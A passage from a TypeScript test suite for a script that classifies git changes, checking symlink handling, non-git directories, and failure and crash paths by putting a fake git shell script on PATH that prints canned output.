        fs.symlinkSync('x', path.join(dir, 'docs/guide.md'));
      },
      (r) => expectFull(r, /^symlink or submodule: docs\/guide\.md$/),
    );

    it('non-git working directory is full with exit 0', () => {
      const plain = fs.mkdtempSync(path.join(os.tmpdir(), 'classify-nogit-'));
      try {
        expectFull(classify([], { ...hermetic(home), GIT_CEILING_DIRECTORIES: path.dirname(plain) }, plain), /failed/);
      } finally {
        fs.rmSync(plain, { recursive: true, force: true });
      }
    });

    const withFakeGit = (script: string[], fn: (env: NodeJS.ProcessEnv) => void) => {
      const bin = fs.mkdtempSync(path.join(os.tmpdir(), 'fakegit-'));
      try {
        const fake = path.join(bin, 'git');
        fs.writeFileSync(fake, ['#!/bin/sh', ...script, ''].join('\n'));
        fs.chmodSync(fake, 0o755);
        fn({ ...process.env, PATH: `${bin}${path.delimiter}${process.env.PATH}` });
      } finally {
        fs.rmSync(bin, { recursive: true, force: true });
      }
    };

    it('failing git is full with reason failed and exit 0', () => {
      withFakeGit(['exit 1'], (env) => expectFull(classify([], env), /failed/));
    });

    it('a crash inside the script still emits full JSON and exit 0', () => {
      withFakeGit(
        [
          'for a in "$@"; do',
          '  case "$a" in',
          "    --raw) printf ':100644 100644 a b M\\tdocs/a.md\\n';;",
          "    --numstat) printf 'x\\ty\\tdocs/a.md\\n';;",
          '  esac',
          'done',
          'exit 0',
        ],
        (env) => expectFull(classify([], env), /script error/),
      );
    });
  });
});
